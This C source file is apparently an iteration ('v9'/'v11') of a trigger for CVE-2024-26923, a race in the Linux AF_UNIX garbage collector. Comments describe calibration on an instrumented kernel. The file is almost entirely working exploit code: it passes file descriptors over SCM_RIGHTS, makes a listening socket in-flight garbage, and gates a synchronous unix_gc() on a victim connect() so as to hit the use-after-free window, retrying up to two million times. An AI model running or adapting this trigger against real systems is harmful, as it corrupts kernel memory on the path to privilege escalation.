/* CVE-2024-26923 trigger, v9 — GC gated on the sender's success.
 *
 * Calibration facts (instrumented kernel, docs/x9-milestones.md M20/M21):
 *   - peer -> embryo-enqueue gap is 60-250 us under TCG; that is the window;
 *   - a GC with N filler candidates ahead of L reaches pass1's scan of L after roughly
 *     the selection plus pass1 walk (~0.6N us), and pass2's scan of L ~0.3N us later;
 *   - delaying the GC by wall clock never aligned (thread start jitter is ~10 ms under
 *     TCG), so instead the GC fires the instant the victim's sender thread succeeds --
 *     which is exactly when connect() published unix_peer().
 *
 * Success detector: the instrumented kernel prints X9SCAN qlen once per pass; a landed
 * race shows pass2's qlen = pass1's qlen + 1.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/un.h>

static struct sockaddr_un g_sa;
static socklen_t g_salen;
static atomic_int g_peer_seen;
static long g_gc_delay_us;   /* delay between sender success and the GC firing */

static void out(const char *fmt, ...)
{
    char b[256];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap);
    va_end(ap);
    if (n > 0) { ssize_t w = write(1, b, (size_t)n); (void)w; }
}

static void on_alarm(int sig)
{
    (void)sig;
    const char *m = "\n[watchdog] time limit\n";
    ssize_t w = write(1, m, strlen(m));
    (void)w;
    _exit(3);
}

static int unix_health(void)
{
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) != 0) return 0;
    int ok = (send(sv[0], "x", 1, MSG_DONTWAIT) == 1);
    close(sv[0]); close(sv[1]);
    return ok;
}

static void pin_cpu(int cpu)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int send_fd(int sock, int fd)
{
    struct msghdr msg;
    struct iovec iov;
    char buf[1] = { 'x' };
    char cbuf[CMSG_SPACE(sizeof(int))];
    memset(&msg, 0, sizeof msg);
    memset(cbuf, 0, sizeof cbuf);
    iov.iov_base = buf;
    iov.iov_len = 1;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof cbuf;
    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    c->cmsg_level = SOL_SOCKET;
    c->cmsg_type = SCM_RIGHTS;
    c->cmsg_len = CMSG_LEN(sizeof fd);
    memcpy(CMSG_DATA(c), &fd, sizeof fd);
    return sendmsg(sock, &msg, MSG_NOSIGNAL);
}

struct vic { int S; int V; };

static void *victim(void *arg)
{
    struct vic *v = arg;
    pin_cpu(1);
    connect(v->S, (struct sockaddr *)&g_sa, g_salen);
    return NULL;
}

static void *sender(void *arg)
{
    struct vic *v = arg;
    pin_cpu(2);
    while (v->V >= 0) {
        if (send_fd(v->S, v->V) > 0) {
            atomic_store(&g_peer_seen, 1);   /* peer published: fire the GC now */
            close(v->V);
            v->V = -1;
            return NULL;
        }
    }
    return NULL;
}

static long long now_ns(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

static void *gc_when_peer(void *arg)
{
    (void)arg;
    pin_cpu(3);
    while (!atomic_load(&g_peer_seen)) { }
    long long t0 = now_ns();
    while (now_ns() - t0 < (long long)g_gc_delay_us * 1000) { }
    int d = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (d >= 0) close(d);                    /* synchronous unix_gc() */
    return NULL;
}

int main(int argc, char **argv)
{
    int fillers = argc > 1 ? atoi(argv[1]) : 80;
    int prefill = argc > 2 ? atoi(argv[2]) : 32;
    g_gc_delay_us = argc > 3 ? atol(argv[3]) : 0;

    signal(SIGALRM, on_alarm);
    alarm(110);
    out("== gc race v11: K-gated GC, fillers=%d prefill=%d gc_delay=%ldus uid=%d ==\n", fillers, prefill, g_gc_delay_us, getuid());
    if (!unix_health()) { out("!! AF_UNIX unhealthy at start\n"); return 2; }

    for (int i = 0; ; i++) {
        char name[32];
        snprintf(name, sizeof name, "x9i%08x", i & 0xfffffff);
        memset(&g_sa, 0, sizeof g_sa);
        g_sa.sun_family = AF_UNIX;
        memcpy(g_sa.sun_path + 1, name, strlen(name));
        g_salen = offsetof(struct sockaddr_un, sun_path) + 1 + strlen(name);

        int L = socket(AF_UNIX, SOCK_STREAM, 0);
        if (L < 0) { out("socket: %d\n", errno); return 1; }
        if (bind(L, (struct sockaddr *)&g_sa, g_salen) < 0) { close(L); continue; }
        listen(L, 128);

        int F[2];
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, F) < 0) { close(L); continue; }
        int made = 0;
        for (int k = 0; k < fillers; k++) {
            int f = socket(AF_UNIX, SOCK_DGRAM, 0);
            if (f < 0) break;
            if (send_fd(F[0], f) <= 0) { close(f); break; }
            close(f);
            made++;
        }

        int H[2];
        int l_ok = 0;
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, H) == 0) {
            if (send_fd(H[0], L) > 0) {
                l_ok = 1;
                close(L);        /* drop the fdtable ref: H[1] keeps L alive as in-flight
                                    garbage, i.e. a GC candidate (as gc_cal.c does) */
            }
            close(H[0]);
        }
        if (!l_ok) { close(H[1]); close(F[0]); close(F[1]); close(L); continue; }

        static int pre[128];
        int npre = 0;
        for (int k = 0; k < prefill; k++) {
            int c = socket(AF_UNIX, SOCK_STREAM, 0);
            if (c < 0) break;
            if (connect(c, (struct sockaddr *)&g_sa, g_salen) != 0) { close(c); break; }
            pre[npre++] = c;
        }

#define KMAX 16
        struct vic vs[KMAX];
        pthread_t tv[KMAX], ts[KMAX], tg;
        int K = 4;
        atomic_store(&g_peer_seen, 0);
        pthread_create(&tg, NULL, gc_when_peer, NULL);
        for (int k = 0; k < K; k++) {
            vs[k].S = socket(AF_UNIX, SOCK_STREAM, 0);
            vs[k].V = socket(AF_UNIX, SOCK_DGRAM, 0);
            pthread_create(&ts[k], NULL, sender, &vs[k]);
            pthread_create(&tv[k], NULL, victim, &vs[k]);
        }
        for (int k = 0; k < K; k++) {
            pthread_join(tv[k], NULL);
            pthread_join(ts[k], NULL);
        }
        pthread_join(tg, NULL);

        for (int k = 0; k < K; k++) {
            close(vs[k].S);
            if (vs[k].V >= 0) close(vs[k].V);
        }
        for (int k = 0; k < npre; k++) close(pre[k]);
        close(H[1]);
        close(F[0]); close(F[1]);

        if ((i % 50) == 0) out("  attempt %d (fillers %d)\n", i, made);
        if ((i % 20) == 0 && !unix_health()) {
            out("!! AF_UNIX HEALTH FAILURE at attempt %d\n", i);
            return 2;
        }
        if (i > 2000000) break;
    }
    out("== done ==\n");
    return 0;
}
